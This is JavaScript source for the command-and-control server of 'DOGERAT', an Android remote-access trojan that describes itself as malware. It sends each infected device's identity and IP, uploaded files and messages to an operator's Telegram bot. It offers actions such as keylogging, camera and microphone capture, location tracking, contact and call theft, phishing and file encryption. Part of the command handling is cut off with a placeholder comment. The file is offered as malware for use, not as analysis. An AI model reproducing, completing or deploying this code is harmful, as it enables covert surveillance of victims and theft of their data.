const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// تحميل بيانات الإعدادات
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new telegramBot(data.token, { polling: true, request: {} });

const appData = new Map();

// قائمة الإجراءات المتاحة
const actions = [
    '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯',
    '✯ 𝙲𝚊𝚕𝚕𝚜 ✯',
    '✯ 𝙲𝚊𝚕𝚕𝚜 ✯',
    '✯ 𝙰𝚙𝚙𝚜 ✯',
    '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯',
    '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯',
    '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯',
    '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯',
    '✯ 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 ✯',
    '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯',
    '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯',
    '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯',
    '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯',
    '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯',
    '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯',
    '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯',
    '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯',
    '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯',
    '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯',
    '✯ 𝚃𝚘𝚊𝚜𝚝 ✯',
    '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯',
    '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯',
    '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯',
    '✯ 𝙰𝚕𝚕 ✯'
];

// endpoint لرفع الملفات
app.post('/upload', uploader.single('file'), (req, res) => {
    const fileBuffer = req.file.buffer;
    const fileName = req.file.originalname;
    
    bot.sendDocument(data.id, req.file.buffer, {
        caption: '<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + fileName + '</b>',
        parse_mode: 'HTML'
    }, {
        filename: fileName,
        contentType: 'file'
    });
    
    res.send('Done');
});

// endpoint للحصول على المضيف
app.get('/host', (req, res) => {
    res.send(data.host);
});

// التعامل مع اتصالات Socket
io.on('connection', socket => {
    let deviceId = socket.handshake.headers['device-id'] + '-' + io.sockets.sockets.size || 'no information';
    let deviceModel = socket.handshake.headers['user-agent'] || 'no information';
    let deviceIp = socket.handshake.headers['x-forwarded-for'] || 'no information';
    
    socket.deviceId = deviceId;
    socket.deviceModel = deviceModel;

    let connectMessage = '<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚗𝚍</b>\n\n' +
                       '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 → ' + deviceId + '\n</b>' +
                       '<b>𝚖𝚘𝚍𝚎𝚕 → ' + deviceModel + '\n</b>' +
                       '<b>𝚒𝚙 → ' + deviceIp + '\n</b>' +
                       '<b>𝚝𝚒𝚖𝚎 → ' + socket.handshake.time + '\n\n</b>';

    bot.sendMessage(data.id, connectMessage, { parse_mode: 'HTML' });

    // التعامل مع انقطاع الاتصال
    socket.on('disconnect', () => {
        let disconnectMessage = '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n' +
                              '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 → ' + deviceId + '\n</b>' +
                              '<b>𝚖𝚘𝚍𝚎𝚕 → ' + deviceModel + '\n</b>' +
                              '<b>𝚒𝚙 → ' + deviceIp + '\n</b>' +
                              '<b>𝚝𝚒𝚖𝚎 → ' + socket.handshake.time + '\n\n</b>';
        bot.sendMessage(data.id, disconnectMessage, { parse_mode: 'HTML' });
    });

    // التعامل مع الرسائل من الأجهزة
    socket.on('message', message => {
        bot.sendMessage(data.id, '<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + deviceId + '\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>' + message, { parse_mode: 'HTML' });
    });
});

// التعامل مع أوامر التليجرام
bot.on('message', msg => {
    if (msg.text === '/start') {
        bot.sendMessage(data.id, 
            '<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT</b>\n\n' +
            'DOGERAT 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜\n' +
            '𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\n\n' +
            '𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @CYBERSHIELDX', 
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: true
                }
            });
    }
    // ... باقي التعامل مع الأوامر
});

// إرسال ping دوري للأجهزة
setInterval(() => {
    io.sockets.sockets.forEach((socket, id, sockets) => {
        io.to(id).emit('ping', {});
    });
}, 5000);

// الحفاظ على السيرفر نشط
setInterval(() => {
    https.get(data.host, res => {}).on('error', err => {});
}, 480000);

// تشغيل السيرفر
server.listen(process.env.PORT || 3000, () => {
    console.log('listening on port 3000');
});
